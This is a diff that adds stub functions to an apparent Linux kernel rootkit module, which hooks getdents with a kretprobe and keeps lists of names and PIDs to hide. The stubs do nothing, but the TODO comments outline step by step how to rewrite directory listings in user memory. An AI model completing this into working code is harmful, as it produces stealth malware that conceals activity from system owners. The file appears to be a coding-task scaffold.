@@ -1,4 +1,5 @@
 // SPDX-License-Identifier: GPL-2.0
+#include <linux/types.h>
 #include <linux/dirent.h>
 #include <linux/init.h>
 #include <linux/kprobes.h>
@@ -27,10 +28,20 @@ static struct rk_target_list pid_targets;
 /* TODO: Implement rk_target_add(list, name)
  * spin_lock_irqsave, check count < max, strscpy, count++, spin_unlock_irqrestore
  */
+static int rk_target_add(struct rk_target_list *list, const char *name)
+{
+	/* TODO: implement */
+	return -ENOSYS;
+}
 
 /* TODO: Implement rk_target_remove(list, idx)
  * spin_lock_irqsave, validate idx, memmove to close gap, count--, spin_unlock_irqrestore
  */
+static int rk_target_remove(struct rk_target_list *list, int idx)
+{
+	/* TODO: implement */
+	return -ENOSYS;
+}
 
 /* TODO: Implement rk_target_match(list, name)
  * spin_lock_irqsave, iterate and strcmp, return true/false, spin_unlock_irqrestore
@@ -52,6 +63,11 @@ struct getdents_data {
  * Then read the user buffer pointer from uregs->si into ri->data.
  * Return 1 if uregs is NULL to skip the return handler.
  */
+static int getdents_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+	/* TODO: implement */
+	return 0;
+}
 
 /* TODO: Implement getdents_return(ri, regs)
  * Get total byte count from regs_return_value. If <= 0, return.
@@ -63,6 +79,11 @@ struct getdents_data {
  * If total changed: copy_to_user, regs_set_return_value with new total.
  * kfree the buffer.
  */
+static int getdents_return(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+	/* TODO: implement */
+	return 0;
+}
 
 static struct kretprobe getdents_probe = {
 	.handler        = getdents_return,
